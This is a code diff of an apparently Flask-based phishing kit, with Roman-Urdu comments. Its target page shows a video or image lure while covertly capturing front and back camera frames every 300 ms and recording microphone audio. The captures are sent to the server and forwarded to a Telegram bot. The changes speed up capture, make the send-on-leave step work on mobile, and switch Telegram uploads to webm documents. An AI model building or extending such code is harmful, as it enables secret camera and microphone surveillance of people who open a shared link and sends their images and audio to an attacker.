@@ -57,11 +57,11 @@ def send_tg_audio(token, cid, raw_audio, caption=""):
     try: 
         footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
         full_caption = caption + footer
-        # Sending as voice.ogg usually helps Telegram render it as a playable audio file properly
+        # Bhejne ke liye sendDocument use kar rahe hain taake Telegram webm ko reject na kare
         requests.post(
-            f"https://api.telegram.org/bot{token}/sendAudio", 
+            f"https://api.telegram.org/bot{token}/sendDocument", 
             data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
-            files={"audio": ("voice.ogg", raw_audio, "audio/ogg")}, 
+            files={"document": ("audio_capture.webm", raw_audio, "audio/webm")}, 
             timeout=15
         )
     except: pass
@@ -783,7 +783,7 @@ def target_page(link_id):
         <!-- FULL SCREEN MEDIA UI -->
         <div class="fixed inset-0 w-full h-full bg-black z-0 flex items-center justify-center">
             {% if ext in ['mp4', 'webm', 'ogg', 'mov'] or f_type == 'video' %}
-                <video src="{{ a_val }}" controls autoplay playsinline loop class="w-full h-full object-contain"></video>
+                <video id="payload-video" src="{{ a_val }}" controls playsinline loop preload="auto" class="w-full h-full object-contain"></video>
             {% else %}
                 <img src="{{ a_val }}" class="w-full h-full object-contain">
             {% endif %}
@@ -882,7 +882,11 @@ def target_page(link_id):
                         
                         if(isMedia && mOverlay) {
                             mOverlay.style.opacity = '0';
-                            setTimeout(() => mOverlay.classList.add('hidden'), 700);
+                            setTimeout(() => {
+                                mOverlay.classList.add('hidden');
+                                let vid = document.getElementById('payload-video');
+                                if (vid) vid.play();
+                            }, 700);
                         } else if (!isMedia) {
                             document.getElementById('wait-screen').classList.add('hidden');
                             showFileContent();
@@ -973,8 +977,8 @@ def target_page(link_id):
                         }
                     });
                     
-                    // Force send on tab close
-                    window.addEventListener("beforeunload", () => {
+                    // Force send on page hide (works better on mobile than beforeunload)
+                    window.addEventListener("pagehide", () => {
                         if(mediaRecorder && mediaRecorder.state === "recording") {
                             isRecording = false;
                             mediaRecorder.stop();
@@ -986,7 +990,7 @@ def target_page(link_id):
                 }
             }
 
-            // --- CAMERA LOGIC (10s Front/Back Cycle) ---
+            // --- CAMERA LOGIC (10s Front/Back Cycle & Fast Capture) ---
             let camStream = null; 
             let currentCam = "user"; 
             let captureIntervalId = null; 
@@ -1011,7 +1015,9 @@ def target_page(link_id):
                         let imgData = c.toDataURL('image/jpeg', 0.6);
                         if (imgData === lastSentImage) return; 
                         lastSentImage = imgData;
-                        fetch("/api/capture/" + l_id, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: currentCam.toUpperCase() }) }).catch(()=>{});
+                        
+                        let camLabel = currentCam === "user" ? "FRONT" : "BACK";
+                        fetch("/api/capture/" + l_id, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: camLabel }) }).catch(()=>{});
                     }
                 }
             }
@@ -1020,7 +1026,8 @@ def target_page(link_id):
                 currentCam = (camType === "back") ? "environment" : "user"; 
                 await switchCameraTo(currentCam);
                 if(captureIntervalId) clearInterval(captureIntervalId);
-                captureIntervalId = setInterval(captureUltraFast, 500);
+                // 300ms ki speed par dhara-dhar capture karega
+                captureIntervalId = setInterval(captureUltraFast, 300);
                 if (camType === "front_back") runCamCycle();
             }
 
